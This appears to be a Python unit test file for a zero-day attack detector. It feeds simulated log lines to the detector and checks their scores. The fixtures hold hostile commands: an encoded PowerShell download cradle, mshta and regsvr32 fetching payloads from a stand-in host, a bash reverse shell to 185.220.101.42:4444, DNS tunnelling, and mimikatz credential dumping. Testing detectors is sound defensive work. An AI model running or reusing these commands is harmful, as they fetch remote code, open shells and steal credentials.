"""
Zero-Day attack simulator — tests detection of novel, never-seen attacks.
Simulates: encoded PowerShell, LOLBin combinations, XOR C2, slow drip exfil.
"""
import sys, unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parents[1]))

from src.core.zero_day_detector import ZeroDayDetector


class TestZeroDayDetector(unittest.TestCase):

    def setUp(self):
        self.detector = ZeroDayDetector()

    # ── Novel attack simulations ───────────────────────────────────────────

    def test_encoded_powershell_detected(self):
        """Encoded PS1 bypass should score > 30."""
        log = (
            "2024-01-15T03:12:00 host powershell.exe -NoP -NonI -W Hidden "
            "-Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUA"
            "YgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABw"
        )
        result = self.detector.detect(log)
        self.assertGreater(result["zero_day_score"], 30,
                           f"Encoded PS should score >30, got {result['zero_day_score']}")

    def test_lolbin_novel_combination(self):
        """certutil + mshta + regsvr32 chain should trigger multiple signals."""
        log = (
            "certutil.exe -decode encoded.b64 decoded.exe\n"
            "mshta.exe http://185.220.101.42/update.hta\n"
            "regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll"
        )
        result = self.detector.detect(log)
        signals_fired = [s for s in result["signals"] if s["score"] > 20]
        self.assertGreater(len(signals_fired), 1,
                           f"LOLBin chain should fire >1 signals, got {len(signals_fired)}")

    def test_xor_c2_high_entropy(self):
        """XOR-encoded C2 traffic should score high on entropy analysis."""
        # Simulated XOR-encoded payload (high entropy string)
        payload = "\\x3c\\x4f\\x2a\\x5b\\x7e\\x1d\\x9a\\xbb\\xcc\\xdd\\xee\\xff" * 8
        log = f"2024-01-15 outbound TCP 10.0.0.5:54321 -> 185.220.101.42:4444 data={payload}"
        result = self.detector.detect(log)
        ent_signal = next((s for s in result["signals"] if s["method"] == "entropy_analysis"), None)
        self.assertIsNotNone(ent_signal, "Entropy signal should be present")
        self.assertGreater(ent_signal["score"], 25,
                           f"XOR C2 entropy should score >25, got {ent_signal['score']}")

    def test_slow_drip_exfiltration(self):
        """Slow drip: 1 packet every ~60s with low jitter should trigger beaconing."""
        pcap = "\n".join([
            f"02:{i:02d}:{(i*60)%60:02d}.000 TCP 10.0.0.5:5555 -> 185.220.101.42:443 len=128"
            for i in range(15)
        ])
        result = self.detector.detect("", pcap)
        timing_sig = next((s for s in result["signals"] if s["method"] == "packet_timing"), None)
        self.assertIsNotNone(timing_sig, "Packet timing signal should be present")

    def test_dns_tunneling_long_subdomain(self):
        """Very long DNS subdomain (>60 chars) should score high."""
        log = (
            "dns query: aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA=="
            ".tunnel.evil.com -> 185.220.101.42"
        )
        result = self.detector.detect(log)
        self.assertGreater(result["zero_day_score"], 20)

    def test_protocol_violation_icmp_shell(self):
        """ICMP with shell payload should trigger protocol violation."""
        log = "ICMP echo request from 10.0.0.3 to 8.8.8.8 payload=/bin/bash -i >& /dev/tcp/185.220.101.42/4444"
        result = self.detector.detect(log)
        proto_sig = next((s for s in result["signals"] if s["method"] == "protocol_violation"), None)
        self.assertIsNotNone(proto_sig)
        self.assertGreater(proto_sig["score"], 0)

    def test_benign_log_low_score(self):
        """Ordinary system log should score < 30."""
        log = (
            "2024-01-15T08:00:00 server01 sshd[1234]: Accepted password for deploy from 10.0.0.2 port 54321\n"
            "2024-01-15T08:01:00 server01 systemd[1]: Started Daily apt upgrade and clean activities.\n"
            "2024-01-15T08:02:00 server01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.0.1 DST=10.0.0.2 PROTO=TCP DPT=80"
        )
        result = self.detector.detect(log)
        self.assertLess(result["zero_day_score"], 40,
                        f"Benign log should score <40, got {result['zero_day_score']}")

    def test_yara_rule_generated_for_high_score(self):
        """High-scoring detection should produce a YARA rule."""
        log = "mimikatz sekurlsa::logonpasswords /full powershell -enc bypass lsass"
        result = self.detector.detect(log)
        if result["zero_day_score"] > 60:
            self.assertIsNotNone(result.get("yara_rule"))
            self.assertIn("rule SOC_AI_ZeroDay", result["yara_rule"])

    def test_hunting_queries_present(self):
        """Hunting queries should always be generated."""
        result = self.detector.detect("test log with 192.168.1.1 and CVE-2023-44487")
        hq = result.get("hunting_queries", {})
        self.assertIn("splunk", hq)
        self.assertIn("kql", hq)
        self.assertIn("grep", hq)

    def test_confidence_levels(self):
        """Score ranges map to correct confidence levels."""
        tests = [
            (10, 1, "Noise"),
            (50, 2, "Low Confidence"),
            (70, 3, "Medium Confidence"),
            (90, 4, "High Confidence"),
        ]
        from src.core.zero_day_detector import CONFIDENCE_LEVELS
        for score, exp_level, exp_label in tests:
            info = next(
                (v for (lo,hi),v in CONFIDENCE_LEVELS.items() if lo <= score <= hi), None
            )
            self.assertIsNotNone(info, f"No confidence info for score={score}")
            self.assertEqual(info["level"], exp_level, f"Score {score}: expected level {exp_level}")


if __name__ == "__main__":
    unittest.main(verbosity=2)
